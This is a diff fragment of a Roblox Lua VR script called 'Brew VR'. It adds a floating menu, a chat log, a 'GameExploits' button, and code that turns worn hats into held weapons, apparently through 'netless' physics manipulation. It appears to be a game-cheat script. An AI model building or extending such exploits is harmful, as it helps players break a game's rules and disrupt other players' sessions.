+	Size = ExtraVariables.MenuOpen,
+	Transparency = 1,
+	CanCollide = false,
+	Anchored = true,
+	Name = "PacMan",
+	['CFrame'] = Camera.CFrame
+})
+
+local VrSurface = SetupModel.VrSurface
+game:GetService('RunService').RenderStepped:Connect(function()
+	VrSurface.Parent = User.PlayerGui
+	VrSurface.LightInfluence = 0
+	VrSurface.Adornee = MenuPart
+	local PlaceCFrame = Camera.CFrame * Services.VR:GetUserCFrame(Enum.UserCFrame.Head) * CFrame.new(0,0,-4)
+	MenuPart.CFrame = MenuPart.CFrame:Lerp(PlaceCFrame,0.06)
+	if ExtraVariables.ActionOpened == true then
+		MenuPart.Parent = Camera
+		if MenuPart.Size ~= ExtraVariables.MenuOpen then
+			Services.TweenService:Create(MenuPart,TweenInfo.new(0.15),{Size = ExtraVariables.MenuOpen}):Play()
+		end
+	else
+		if MenuPart.Size.Magnitude > 0.01 then
+			Services.TweenService:Create(MenuPart,TweenInfo.new(0.15),{Size = Vector3.new(0,0,0)}):Play()
+		end
+		MenuPart.Parent = nil
+	end
+end)
+VrSurface.VrMain.QuickButtons.Leave.MouseButton1Click:Connect(function()
+	pcall(function()
+		game:shutdown()
+	end)
+end)
+function OnClick(Button,Func)
+	Button.MouseButton1Click:Connect(function()
+		PlaySound(3779096010)
+		VrSurface.VrMain.InnerMain.Buttons.Visible = false
+		Func()
+	end)
+end
+local Main = VrSurface.VrMain
+OnClick(Main.QuickButtons.Home,function()
+	for i,v in pairs(VrSurface.VrMain.InnerMain:GetChildren())do
+		v.Visible = false
+	end
+	VrSurface.VrMain.InnerMain.Buttons.Visible = true
+end)
+OnClick(Main.InnerMain.Buttons.AdvancedSettings,function()
+	VrSurface.VrMain.InnerMain.Settings.Visible = true
+end)
+OnClick(Main.QuickButtons.Chat,function()
+	VrSurface.VrMain.InnerMain.Chat.Visible = true
+end)
+OnClick(Main.InnerMain.Buttons.GameExploits,function()
+	VrSurface.VrMain.InnerMain.GameExploits.Visible = true
+end)
+OnClick(Main.InnerMain.Buttons.Players,function()
+	VrSurface.VrMain.InnerMain.Players.Visible = true
+end)
+OnClick(Main.InnerMain.Buttons.QuickOptions,function()
+	Main.InnerMain.QuickActions.Visible = true
+end)
+OnClick(Main.InnerMain.QuickActions.noLegs,function()
+	if GetRigType()=='R6' then
+		Destroy(Character:FindFirstChild("Right Leg"),-1)
+		Destroy(Character:FindFirstChild("Left Leg"),-1)
+	end
+end)
+OnClick(Main.InnerMain.QuickActions.rejoin,function()
+	game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId,game.JobId,User)
+end)
+OnClick(Main.InnerMain.Buttons.ToolProp,function()
+	Main.InnerMain.PropCreation.Visible = true
+	Main.InnerMain.PropCreation.Initialize.Visible = false
+	Main.InnerMain.PropCreation.ToolSelect.Visible = true
+end)
+ExtraVariables.HatsToDisplay = {}
+for i,v in pairs(Character:GetChildren())do
+	if v:IsA("Accessory") then
+		table.insert(ExtraVariables.HatsToDisplay,v)
+	end
+end
+ExtraVariables.ToolButton = Main.InnerMain.PropCreation.ToolSelect.HatName:Clone()
+Main.InnerMain.PropCreation.ToolSelect.HatName:Destroy()
+ExtraVariables.AligningHat = {nil}
+ExtraVariables.Presets = {}
+for i,v in pairs(ExtraVariables.HatsToDisplay)do
+	local Handle = v.Handle:Clone()
+	local newVPF = ExtraVariables.ToolButton:Clone()
+	newVPF.Text = ""
+	Handle.Parent = newVPF.ToolDisplay
+	Handle.Anchored = true
+	local Camera = Create("Camera",newVPF.ToolDisplay,{CFrame = CFrame.new(Handle.Position)*CFrame.new(0,0,5)})
+	local Surround = 0
+	game:GetService("RunService").RenderStepped:Connect(function()
+		Surround=Surround+1
+		Camera.CFrame = CFrame.new(Handle.Position)*CFrame.Angles(0,math.rad(Surround),0)*CFrame.new(0,1.25,2)
+		Camera.CFrame = Camera.CFrame * CFrame.Angles(-math.rad(40/1.25),0,0)
+		Camera.FieldOfView = 60
+		if Surround>9e9 then
+			Surround=1
+		end
+	end)
+	newVPF.ToolDisplay.CurrentCamera=Camera
+	newVPF.Parent = Main.InnerMain.PropCreation.ToolSelect
+	ExtraVariables.AligningHat={v.Handle,v}
+	OnClick(newVPF,function()
+		ExtraVariables.AligningHat = {Handle,v}
+		Main.InnerMain.PropCreation.Visible = true
+		Main.InnerMain.PropCreation.Initialize.Visible = true
+		Main.InnerMain.PropCreation.ToolSelect.Visible = false
+		for i,v in pairs(Main.InnerMain.PropCreation.Initialize.Tool.ToolVPF:GetChildren())do
+			if v:IsA("BasePart") then
+				v:Destroy()
+			end
+		end
+		Main.InnerMain.PropCreation.Initialize.Tool.ToolVPF.CurrentCamera=Camera
+		Handle:Clone().Parent = Main.InnerMain.PropCreation.Initialize.Tool.ToolVPF
+	end)
+end
+ExtraVariables.EquipFromOffset = nil
+ExtraVariables.Initialize=Main.InnerMain.PropCreation.Initialize.Tool
+OnClick(ExtraVariables.Initialize.Yes,function()
+	local Display1 = ExtraVariables.AligningHat[1]:Clone()
+	pcall(function()
+		Display1.AccessoryWeld:Destroy()
+	end)
+	Display1.Parent = workspace.CurrentCamera
+	Display1.Transparency = 0.3
+	Display1.Anchored = true
+	Display1.CanCollide = false
+	local Triggered = false
+	local repositioning2 = false
+	local maneuver = CFrame.new(0,0,0)
+	local Selfex=nil
+	local LetGo = nil
+	Selfex=UIS.InputBegan:Connect(function(key,gp)
+		if UIS:GetFocusedTextBox()==nil then
+			if key.KeyCode==Enum.KeyCode.ButtonR2 then
+				Triggered = true
+				local ObjectSpace = Display1.CFrame:ToObjectSpace(Parts.RightArm.CFrame):Inverse()
+				local theTool = ExtraVariables.CreateHatAsTool("T:"..ExtraVariables.AligningHat[2].Name,ExtraVariables.AligningHat[2].Name,ObjectSpace,true)
+				theTool.Parent = Character
+				ExtraVariables.Presets[ExtraVariables.AligningHat[2]] = theTool
+				Destroy(Display1,-1)
+				Selfex:Disconnect()
+			elseif key.KeyCode==Enum.KeyCode.ButtonR1 then
+				repositioning2 = true
+				maneuver = Display1.CFrame:ToObjectSpace((Camera.CFrame*Services.VR:GetUserCFrame(Enum.UserCFrame.RightHand))):Inverse()
+			end
+		end
+	end)
+	LetGo=UIS.InputEnded:Connect(function(key,gp)
+		if UIS:GetFocusedTextBox()==nil then
+			if key.KeyCode==Enum.KeyCode.ButtonR1 then
+				repositioning2 = false
+				maneuver = Display1.CFrame:ToObjectSpace((Camera.CFrame*Services.VR:GetUserCFrame(Enum.UserCFrame.Head)*CFrame.new(0.5,-0.5,-2))):Inverse()
+			end
+		end
+	end)
+	local Positioner = nil
+	local ReposInterv = 0
+	Display1.CFrame = (Camera.CFrame*Services.VR:GetUserCFrame(Enum.UserCFrame.Head)*CFrame.new(0.5,-0.5,-2))
+	Positioner = game:GetService('RunService').RenderStepped:Connect(function()
+		ExtraVariables.Paused = true
+		if Triggered then
+			ExtraVariables.ActionOpened = true
+			HoldingDirection = false
+			PredictingPosition = false
+			ExtraVariables.Paused = false
+			LetGo:Disconnect()
+			Positioner:Disconnect()
+		else
+			if Display1 then
+				ExtraVariables.ActionOpened = false
+				HoldingDirection = false
+				PredictingPosition = false
+				if maneuver==CFrame.new(0,0,0) then
+					Display1.CFrame = (Camera.CFrame*Services.VR:GetUserCFrame(Enum.UserCFrame.Head))*CFrame.new(0.5,-0.5,-2)
+				else
+					if repositioning2 then
+						Display1.CFrame = (Camera.CFrame*Services.VR:GetUserCFrame(Enum.UserCFrame.RightHand)*maneuver)
+					else
+						Display1.CFrame = (Camera.CFrame*Services.VR:GetUserCFrame(Enum.UserCFrame.Head)*CFrame.new(0.5,-0.5,-2))*maneuver
+					end
+				end
+			end
+		end
+	end)
+end)
+OnClick(Main.InnerMain.PropCreation.Initialize.Tool.Equip,function()
+	local Hat = ExtraVariables.AligningHat[2]
+	if Hat then
+		local Tool = ExtraVariables.Presets[ExtraVariables.AligningHat[2]]
+		if Tool then
+			Tool.Parent = Character
+		end
+	end
+end)
+local LayedOut=0
+local Label = Main.InnerMain.Chat.ChatLogs.FreshLog
+Label.Parent=nil
+Label=Label:Clone()
+ExtraVariables.CreateLabelInChat=function(Text,Color)
+	LayedOut=LayedOut+1
+	local Info = Label:Clone()
+	Info.Text = Text
+	Info.TextColor3=Color
+	Info.Parent = Main.InnerMain.Chat.ChatLogs
+	Info.LayoutOrder = LayedOut
+	Main.InnerMain.Chat.ChatLogs.CanvasPosition = Vector2.new(0,100000000)
+	Info.Size = UDim2.new(0,Info.TextBounds.X,0,Info.TextBounds.Y)
+	task.delay(60*5,function()
+		Info:Destroy()
+	end)
+end
+function DidChat(player)
+	if player:IsFriendsWith(User.UserId) then
+		ExtraVariables.CreateLabelInChat("Your friend, '"..player.Name .. " (@" ..player.DisplayName ..")' joined your game.",Color3.new(0,1,0))
+	elseif player==User then
+		ExtraVariables.CreateLabelInChat("Brew VR was created by Amokah (aka VulpineQueen) - Please do not share.",Color3.new(1,1,0))
+	end
+	Main.InnerMain.Chat.ChatLogs.CanvasSize = UDim2.new(0,0,0,GetLabels())
+	Main.InnerMain.Chat.ChatLogs.CanvasPosition = Vector2.new(0,GetLabels())
+	local selfex = nil
+	selfex = game:GetService('Players').PlayerRemoving:Connect(function(ins)
+		if ins==player then
+			selfex:Disconnect()
+			ExtraVariables.CreateLabelInChat("Player, '"..player.Name .. " (@" .. player.DisplayName..")' has left the game.",Color3.new(1,0.35,0.35))
+		end
+	end)
+	player.Chatted:Connect(function(msg)
+		LayedOut=LayedOut+1
+		local Info = Label:Clone()
+		Info.Text = "[".. player.DisplayName  .."] : " .. msg
+		Info.Parent = Main.InnerMain.Chat.ChatLogs
+		Info.LayoutOrder = LayedOut
+		Main.InnerMain.Chat.ChatLogs.CanvasPosition = Vector2.new(0,100000000)
+		Info.Size = UDim2.new(0,Info.TextBounds.X,0,Info.TextBounds.Y)
+		Main.InnerMain.Chat.ChatLogs.CanvasSize = UDim2.new(0,0,0,GetLabels())
+		Main.InnerMain.Chat.ChatLogs.CanvasPosition = Vector2.new(0,GetLabels())
+		task.delay(60*5,function()
+			Info:Destroy()
+		end)
+	end)
+end
+local CB = Main.InnerMain.Chat.ChattingBar
+function GetLabels()
+	local Scale = 0
+	for i,v in pairs(Main.InnerMain.Chat.ChatLogs:GetChildren())do
+		if v:IsA("GuiObject") then
+			Scale=v.AbsoluteSize.Y+0
+		end
+	end
+	return Scale
+end
+CB.FocusLost:Connect(function(ep)
+	if ep then
+		LayedOut=LayedOut+1
+		local Info = Label:Clone()
+		Info.Text = "[".. User.DisplayName  .."] : " .. CB.Text
+		Info.Parent = Main.InnerMain.Chat.ChatLogs
+		Info.LayoutOrder = LayedOut
+		Main.InnerMain.Chat.ChatLogs.CanvasSize = UDim2.new(0,0,0,GetLabels())
+		Main.InnerMain.Chat.ChatLogs.CanvasPosition = Vector2.new(0,GetLabels())
+		Info.Size = UDim2.new(0,Info.TextBounds.X,0,Info.TextBounds.Y)
+		task.delay(60*5,function()
+			Info:Destroy()
+		end)
+		SendChat(CB.Text)
+		CB.Text = ""
+	end
+end)
+Services.UIS.InputBegan:Connect(function(k,gp)
+	if Services.UIS:GetFocusedTextBox() == nil and CB:IsFocused()==false then
+		if k.KeyCode == Enum.KeyCode.Slash then
+			task.defer(function()
+				CB:CaptureFocus()
+				CB.Text = ""
+			end)
+		end
+	end
+end)
+Services.Players.PlayerAdded:Connect(DidChat)
+for i,v in pairs(Services.Players:GetPlayers())do
+	DidChat(v)
+end
+ExtraVariables.ActionTriggered.Event:Connect(function(b)
+	ExtraVariables.ActionOpened = b
+	if b == true then
+		PlaySound(8379220604)
 	end
 end)
 
@@ -2365,42 +2740,8 @@ Cloned.Parent = ViewportFrame
 --//
 
 --\\Model Creation for earlier tables: For organization
-
---// Motion functions
---local Up = Create("Part",workspace.CurrentCamera,{
---	Size = Vector3.new(1.5,0,3),
---	Name = "RayHitUpwards",
---	Anchored = true,
---})
---local Down = Create("Part",workspace.CurrentCamera,{
---	Size = Vector3.new(1.5,0,3),
---	Name = "RayHitDownwards",
---	Anchored = true,
---})
---local TimeTillFunction=os.clock()
---game:GetService("RunService").RenderStepped:Connect(function()
---	pcall(function()
---		Up.CFrame = CharacterLimbs.Head.CFrame*CFrame.new(1,1,-1.5)
---		Down.CFrame = CharacterLimbs.Head.CFrame*CFrame.new(1,-1.5,-1.5)
---		local RayX = Ray.new(CharacterLimbs.RightArm.Position,CFrame.lookAt(CharacterLimbs.RightArm.Position,(CharacterLimbs.RightArm.CFrame*CFrame.new(0,0,5)).Position).LookVector*50)
---		local Hit,Position = workspace:FindPartOnRayWithWhitelist(RayX,{Up,Down},true,true)
---		if Hit then
---			if Hit==Down then
---				TimeTillFunction = os.clock()
---			end
---		end
---		if os.clock()-TimeTillFunction > 0.2 and os.clock()-TimeTillFunction < 1 then
---			TimeTillFunction = math.huge
---			MovementFunctions.ChangeTool(1)
---		end
---	end)
---end)
---\\
-
 --//Finalized
-if game:GetService("RunService"):IsStudio() then
-	SetupModel = game.Players.FakeMenu
-end
+
 function GetTrueVisibility(Object:GuiObject)
 	local v = Object.Visible
 	local p = Object.Parent
@@ -2409,100 +2750,6 @@ function GetTrueVisibility(Object:GuiObject)
 	end
 	return v
 end
-local MenuSetup = {
-	Menu = SetupModel.FakeMenu,
-	GuiMouse = SetupModel.FakeMenu.ActionMenu.FakeMouse,
-	CurrentCamera = SetupModel:FindFirstChild('ViewCam') or Instance.new('Camera'),
-	ActionMenu = SetupModel.FakeMenu.ActionMenu
-}
-MenuSetup.Menu.CanCollide=false
-MenuSetup.Menu.ActionMenu.Enabled=false
-MenuSetup.Menu.Logo.Enabled=false
-function OnClick(button,func)
-	local Color1 = button.BackgroundColor3
-	game:GetService("RunService").RenderStepped:Connect(function()
-		local ABS = MenuSetup.GuiMouse.AbsolutePosition
-		if GetTrueVisibility(button)==true and (ABS.X > button.AbsolutePosition.X and ABS.X < button.AbsolutePosition.X+button.AbsoluteSize.X and ABS.Y < button.AbsolutePosition.Y+button.AbsoluteSize.Y and ABS.Y > button.AbsolutePosition.Y) then
-			button.BackgroundColor3 = Color3.new(Color1.R+0.2,Color1.G+0.2,Color1.B+0.2)
-		else
-			button.BackgroundColor3 = Color1
-		end
-	end)
-	Services.UIS.InputBegan:Connect(function(k)
-		if k.KeyCode==Enum.KeyCode.ButtonR2 and button:IsA("GuiObject") then
-			local ABS = MenuSetup.GuiMouse.AbsolutePosition
-			if GetTrueVisibility(button)==true and (ABS.X > button.AbsolutePosition.X and ABS.X < button.AbsolutePosition.X+button.AbsoluteSize.X and ABS.Y < button.AbsolutePosition.Y+button.AbsoluteSize.Y and ABS.Y > button.AbsolutePosition.Y) then
-				PlaySound(6324790483)
-				func()
-			end
-		end
-	end)
-end
-local MainScreen=MenuSetup.ActionMenu.External
-OnClick(MainScreen.Menu.Buttons.Chat,function()
-	ExtraVariables.ChatOpened=not ExtraVariables.ChatOpened
-	ToggleChatMenu(ExtraVariables.ChatOpened)
-	ExtraVariables.ActionOpened=not ExtraVariables.ActionOpened
-	ExtraVariables.ActionTriggered:Fire(ExtraVariables.ActionOpened)
-end)
-OnClick(MainScreen.Menu.Buttons.QuickOptions,function()
-	for _,x in pairs(MainScreen.Menu:GetChildren())do
-		pcall(function()
-			x.Visible = false
-		end)
-	end
-	MainScreen.Menu.QuickOptions.Visible = true
-end)
-OnClick(MainScreen.Menu.QuickOptions.RLegs,function()
-	pcall(function()
-		Destroy(Character:FindFirstChild("Left Leg"),-1)
-		Destroy(Character:FindFirstChild("Right Leg"),-1)
-		CharacterLimbs.LeftLeg=nil
-		CharacterLimbs.RightLeg=nil
-	end)
-end)
-OnClick(MainScreen.Menu.QuickOptions.Rejoin,function()
-	game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId,game.JobId,User)
-end)
-MainScreen.Menu.QuickOptions.Option2.OptionLabel.Text = "Display Usernames"
-OnClick(MainScreen.Menu.QuickOptions.Option1.Toggle,function()
-	local Button = MainScreen.Menu.QuickOptions.Option1.Toggle
-	local Toggled = Button.Text:len()>0
-	if Toggled then
-		Button.Text = ""
-	else
-		Button.Text = Check
-	end
-	ExtraVariables.TurnArmsForTools = not Toggled
-end)
-OnClick(MainScreen.Menu.QuickOptions.Option2.Toggle,function()
-	local Button = MainScreen.Menu.QuickOptions.Option2.Toggle
-	local Toggled = Button.Text:len()>0
-	if Toggled then
-		Button.Text = ""
-	else
-		Button.Text = Check
-	end
-	ExtraVariables.DisplayNames = not Toggled
-end)
-OnClick(MainScreen.Menu.QuickOptions.Option3.Toggle,function()
-	local Button = MainScreen.Menu.QuickOptions.Option3.Toggle
-	local Toggled = Button.Text:len()>0
-	if Toggled then
-		Button.Text = ""
-	else
-		Button.Text = Check
-	end
-	ExtraVariables.CharacterViewport = not Toggled
-end)
-OnClick(MainScreen.Menu.QuickOptions.Title.Close,function()
-	for _,x in pairs(MainScreen.Menu:GetChildren())do
-		pcall(function()
-			x.Visible = false
-		end)
-	end
-	MainScreen.Menu.Buttons.Visible = true
-end)
 
 function CharactersAdded(_player)
 	_player.CharacterAdded:Connect(function(char0)
@@ -2528,38 +2775,6 @@ function CharactersAdded(_player)
 end
 Services.Players.PlayerAdded:Connect(CharactersAdded)
 
-MenuSetup.Menu.ActionMenu.Parent = User.PlayerGui
-game:GetService("RunService").RenderStepped:Connect(function()
-	MenuSetup.Menu.CFrame = (Parts.LeftArm.CFrame*CFrame.new(0.5,-3,2.5)) * CFrame.new(2.56346607, -2.55848217, -1.17437077, -1, 0, 0, 0, -0.236597493, -0.971607685, 0, -0.971607566, 0.236597523):Inverse()
-	MenuSetup.CurrentCamera.CFrame = MenuSetup.Menu.CFrame * SetupModel.OffsetFromFakeMenu.Value:Inverse()
-	if ExtraVariables.ActionOpened == true then
-		local ForwardRay = Ray.new(Parts.RightArm.Position,(Parts.RightArm.CFrame*CFrame.Angles(-math.pi/2,0,0)).LookVector*10)
-		local Found,Position = workspace:FindPartOnRayWithWhitelist(ForwardRay,{SetupModel},true)
-		if Position then
-			local Pos = MenuSetup.CurrentCamera:WorldToViewportPoint(Position)
-			MenuSetup.ActionMenu.FakeMouse.Position = UDim2.new(Pos.X,0,Pos.Y,0)
-		end
-	else
-		MenuSetup.ActionMenu.FakeMouse.Position = UDim2.new(-15,0,0,0)
-	end
-end)
-Services.StarterGui:SetCore("VRLaserPointerMode", 0)
-Services.StarterGui:SetCore("VREnableControllerModels", false)
-
-ExtraVariables.ActionTriggered.Event:Connect(function(b)
-	if b == true then
-		PlaySound(4850864425)
-		MenuSetup.Menu.Parent=workspace.CurrentCamera;
-		MenuSetup.ActionMenu.Enabled = true
-		MenuSetup.Menu.Logo.Enabled=true
-	else
-		PlaySound(4499400560)
-		MenuSetup.Menu.Parent=workspace.CurrentCamera;
-		MenuSetup.ActionMenu.Enabled = false
-		MenuSetup.Menu.Logo.Enabled=false
-	end
-end)
-
 repeat task.wait(-1) until ExtraVariables.VrFinalized == true
 task.wait(0.5)
 PromptMessage([[
@@ -2579,71 +2794,71 @@ TWIST RIGHT ARM : Change tools left to right
 
 --//Tools
 local HatsAsTools={}
-function CreateHatAsTool(ToolName,HatNameOrHatInstance,Offset,PlaceBackWhenUnequipped,OffsetFromMiddle)
-	local Silly = nil
-	if type(HatNameOrHatInstance)=='string' then
-		Silly = Character:FindFirstChild(HatNameOrHatInstance)
-	else
-		Silly=HatNameOrHatInstance
-	end
-	if Silly then
-		table.insert(HatsAsTools,Silly)
-		local SillyHandle = Silly:FindFirstChildWhichIsA("BasePart")
-		local AccessoryWeld = SillyHandle.AccessoryWeld
-		local UnequippedOffset = AccessoryWeld.Part0.CFrame:ToObjectSpace(AccessoryWeld.Part1.CFrame):Inverse()
-		local From = AccessoryWeld.Part1
-		if SillyHandle then
-			local NewTool = Instance.new("Tool")
-			NewTool.Name = "{VR Tool}: " .. tostring(ToolName)
-			InsertHatTool(NewTool)
-			local Offset = Offset--CFrame.new(-0.0206413269, -1.05122375, 0.875359535, 1, 0, 0, 0, -4.37113847e-08, -1, 0, 0.999999881, -4.37113883e-08)
-			pcall(function()
-				SillyHandle.AccessoryWeld:Destroy()
-			end)
-			local sself = nil
-			sself = game:GetService("RunService").RenderStepped:Connect(function()
-				if not SillyHandle:IsDescendantOf(workspace) then return sself:Disconnect() end
-				for i,v in pairs(User.Character:GetChildren())do
-					if v:IsA("Accessory") then
-						if not table.find(HatsAsTools,v) then
-							v.Handle.LocalTransparencyModifier = 1
-						else
-							v.Handle.LocalTransparencyModifier = 0
-						end
-					end
-				end
-				pcall(function()
-					SillyHandle.LocalTransparencyModifier=0
-					SillyHandle.Transparency=0
-					SillyHandle.Massless = true
-				end)
-				if NewTool.Parent==User.Character then
-					SillyHandle.CFrame = Parts.RightArm.CFrame*Offset:Inverse()
-				else
-					if PlaceBackWhenUnequipped ~= true then
-						if not OffsetFromMiddle then
-							SillyHandle.CFrame = CharacterLimbs.Head.CFrame*CFrame.new(0,-1.5,0)
-						else
-							SillyHandle.CFrame = CharacterLimbs.Head.CFrame*CFrame.new(0,-1.5,0) * OffsetFromMiddle:Inverse()
-						end
-					else
-						SillyHandle.CFrame = From.CFrame * UnequippedOffset
-					end
-				end
-			end)
-			Maintain(SillyHandle)
-			NewTool.Parent = User.Backpack
+
+function CreateHatAsTool(ToolName,Hat,Offset,PlaceBackWhenUnequipped) 
+	local NewTool = Create('Tool',nil,{Name=ToolName,RequiresHandle=true})
+	for i,v in pairs(Character:GetChildren())do
+		if v.Name==Hat or v==Hat and v:IsA("Accessory") then
+			Hat=v
+			break
 		end
 	end
+	if type(Hat)=='string' then
+		return nil
+	end
+	if ExtraVariables.LocalProps[Hat]~=nil then
+		ExtraVariables.LocalProps[Hat].GripOffset.Value = Offset
+		return ExtraVariables.LocalProps[Hat]
+	end
+	ExtraVariables.LocalProps[Hat] = NewTool
+	local Handle = Hat:FindFirstChild("Handle")
+	Netless(Handle)
+	if Handle:FindFirstChild("AccessoryWeld") then
+		Create("CFrameValue",Handle,{Value=Handle.AccessoryWeld.C0,Name="C0"})
+		Create("CFrameValue",Handle,{Value=Handle.AccessoryWeld.C1,Name="C1"})
+		Create("CFrameValue",Handle,{Value=Handle.AccessoryWeld.Part0.CFrame:ToObjectSpace(Handle.AccessoryWeld.Part1.CFrame):Inverse(),Name="WeldOffset"})
+		Create("ObjectValue",Handle,{Value=Handle.AccessoryWeld.Part0,Name="Part0"})
+		Create("ObjectValue",Handle,{Value=Handle.AccessoryWeld.Part1,Name="Part1"})
+		Handle.AccessoryWeld:Destroy()
+	end
+	if NewTool:FindFirstChild("GripOffset")==nil then
+		NewTool:GetPropertyChangedSignal("Parent"):Connect(function()
+			if NewTool.Parent==Character then
+				Handle.Transparency=0
+			else
+				Handle.Transparency=1
+			end
+		end)
+	end
+	local Grip = NewTool:FindFirstChild("GripOffset") or Create("CFrameValue",NewTool,{Value = Offset,Name="GripOffset"})
+	game:GetService("RunService").RenderStepped:Connect(function()
+		if NewTool.Parent==Character then
+			Handle.Transparency=0
+			Handle.CFrame = Parts.RightArm.CFrame*Grip.Value
+			task.defer(function()
+				Handle.CFrame = Parts.RightArm.CFrame*Grip.Value
+			end)
+		else
+			Handle.Transparency=1
+			if PlaceBackWhenUnequipped then
+				Handle.CFrame = Handle.Part1.Value.CFrame * Handle.WeldOffset.Value
+				task.defer(function()
+					Handle.CFrame = Handle.Part1.Value.CFrame * Handle.WeldOffset.Value
+				end)
+			else
+				Handle.CFrame = Character.Head.CFrame*CFrame.new(0,-2,0)
+			end
+		end
+	end)
+	return NewTool
 end
-
+ExtraVariables.CreateHatAsTool = CreateHatAsTool
 CreateHatAsTool("Give an L","Big L",CFrame.new(-0.0206413269, -1.05122375, 0.875359535, 1, 0, 0, 0, -4.37113847e-08, -1, 0, 0.999999881, -4.37113883e-08),false)
 CreateHatAsTool("Pistol","1911 Right",CFrame.new(-0.00897979736, 1.30259275, -0.496437073, -1, 0, 8.74227766e-08, 0, 0.999999881, 0, -8.74227766e-08, 0, -1),true)
 CreateHatAsTool("Knife","Meshes/KnifeFaceAccessory",CFrame.new(-0.88650322, 1.13049304, 0.0296177864, 0, 0, -1, 0, 1, 0, 1, 0, 0),false,CFrame.Angles(0,math.rad(90),0))
 CreateHatAsTool("Big Hammer","MARTILLO",CFrame.new(-0.976185083, -0.770004272, 0.040807724, -9.27258839e-08, -1, 1.1920929e-07, -9.27258839e-08, -2.08616228e-07, -1.00000012, 1.00000036, -9.27258839e-08, -9.27258696e-08),true)
-CreateHatAsTool("Sword","Angel Sword",CFrame.new(-0.00233829999, -0.941128731, -2.9509182, 1.91068547e-15, 4.37113883e-08, 1, 0.999999881, -4.37113847e-08, 0, 4.37113883e-08, 1, -4.37113883e-08),true)
+CreateHatAsTool("Sword","Angel Sword",CFrame.new(-0.00233829999, -0.941128731, -2.9509182, 1.91068547e-15, 4.37113883e-08, 1, 0.999999881, -4.37113847e-08, 0, 4.37113883e-08, 1, -4.37113883e-08):Inverse(),true)
 --//
-
 Services.VR:RecenterUserHeadCFrame()
 
 local simradius = 'shp'
